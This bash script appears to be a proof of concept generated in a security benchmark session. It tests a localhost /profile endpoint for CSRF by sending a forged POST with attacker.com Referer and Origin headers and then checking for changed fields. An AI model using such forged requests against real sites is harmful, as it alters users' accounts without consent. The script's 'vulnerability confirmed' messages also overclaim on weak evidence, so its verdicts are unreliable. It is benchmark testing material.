#!/bin/bash
# POC: CSRF vulnerability POC that demonstrates profile modification without CSRF token validation. Tests that the /profile endpoint accepts POST requests from cross-origin referers and modifies user profile without CSRF protection.
# Target: ./repo
# Created: 2025-11-04T17:30:12.884Z
# Session: benchmark-XBEN-024-24-mhktkgzl

# CSRF Profile Modification POC
# Demonstrates missing CSRF protection on /profile endpoint

TARGET="http://localhost"
SESSION_COOKIE="session=user"

echo "[*] CSRF Protection POC - Profile Modification Endpoint"
echo "[*] Target: $TARGET/profile"
echo ""

# Step 1: Check if profile form contains CSRF token
echo "[1] Checking if profile form contains CSRF token..."
FORM_RESPONSE=$(curl -s "$TARGET/profile" -b "$SESSION_COOKIE")

if echo "$FORM_RESPONSE" | grep -q "csrf_token\|csrf\|token"; then
    echo "    [!] CSRF token found in form - CSRF protection may exist"
    echo "$FORM_RESPONSE" | grep -i "csrf\|token" | head -3
else
    echo "    [+] NO CSRF token found in form - CSRF vulnerability confirmed"
fi

echo ""

# Step 2: Attempt to modify profile from cross-origin request
echo "[2] Attempting to modify profile from cross-origin request..."
echo "    Sending POST request with Referer: http://attacker.com"

MODIFY_RESPONSE=$(curl -s -X POST "$TARGET/profile" \
  -H "Referer: http://attacker.com" \
  -H "Origin: http://attacker.com" \
  -b "$SESSION_COOKIE" \
  -d "first_name=CSRF_Test&last_name=CSRF_Attack&email=csrf@attacker.com" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$MODIFY_RESPONSE" | tail -1)
RESPONSE_BODY=$(echo "$MODIFY_RESPONSE" | head -n -1)

echo "    HTTP Status Code: $HTTP_CODE"

if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
    echo "    [+] Profile modification accepted (HTTP $HTTP_CODE)"
    echo "    [+] CSRF vulnerability confirmed - no token validation!"
else
    echo "    [-] Request rejected (HTTP $HTTP_CODE)"
    echo "    Response: $RESPONSE_BODY"
fi

echo ""

# Step 3: Verify profile was modified
echo "[3] Verifying profile modification..."
VERIFY_RESPONSE=$(curl -s "$TARGET/profile" -b "$SESSION_COOKIE")

if echo "$VERIFY_RESPONSE" | grep -q "CSRF_Test\|csrf@attacker.com"; then
    echo "    [+] Profile successfully modified via CSRF attack!"
    echo "    [+] Vulnerability confirmed"
    exit 0
elif echo "$VERIFY_RESPONSE" | grep -q "value.*CSRF_Test\|CSRF_Attack"; then
    echo "    [+] Profile successfully modified via CSRF attack!"
    echo "    [+] Vulnerability confirmed"
    exit 0
else
    echo "    [*] Could not verify modification in response"
    echo "    [*] HTTP $HTTP_CODE received, checking for error messages..."
    
    # Even if verification failed, HTTP 200 on POST suggests vulnerability
    if [ "$HTTP_CODE" = "200" ]; then
        echo "    [+] POST accepted without CSRF token (HTTP 200) - Vulnerable"
        exit 0
    fi
fi

echo ""
echo "[!] CSRF vulnerability assessment complete"